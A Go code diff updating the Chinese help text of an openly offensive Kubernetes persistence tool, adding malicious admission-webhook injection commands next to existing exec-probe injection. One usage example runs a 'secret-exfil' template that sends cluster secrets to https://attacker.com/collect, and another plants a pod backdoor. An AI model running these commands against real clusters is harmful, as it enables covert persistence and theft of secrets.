@@ -73,17 +73,29 @@ func Usage() string {
 Kubernetes 持久化攻击工具
 
 子命令：
-  probe-inject    通过探针注入实现持久化
-  probe-list      列出所有带有 exec 探针的工作负载
-  probe-restore   移除注入的探针，恢复原始配置
+  probe-inject      通过探针注入实现持久化
+  probe-list        列出所有带有 exec 探针的工作负载
+  probe-restore     移除注入的探针，恢复原始配置
+  webhook-inject    通过恶意 Admission Webhook 实现持久化
+  webhook-list      列出所有 Admission Webhook 配置
+  webhook-restore   移除注入的恶意 Webhook
 
-示例：
+探针注入示例：
   persist probe-inject                    # 交互式注入探针
   persist probe-inject --help             # 查看详细帮助
   persist probe-list                      # 列出所有带探针的工作负载
   persist probe-list -n kube-system       # 列出指定命名空间
   persist probe-restore                   # 交互式移除探针
   persist probe-restore --name nginx -n default  # 移除指定工作负载的探针
+
+Webhook 注入示例：
+  persist webhook-inject                  # 交互式注入 Webhook
+  persist webhook-inject -t secret-exfil --exfil-url https://attacker.com/collect
+  persist webhook-inject -t pod-backdoor --image busybox
+  persist webhook-list                    # 列出 kctl 管理的 Webhook
+  persist webhook-list --all              # 列出所有 Webhook
+  persist webhook-restore                 # 交互式移除 Webhook
+  persist webhook-restore --name xxx      # 移除指定 Webhook
 
 使用 'persist <subcommand> --help' 查看子命令详细用法`
 }
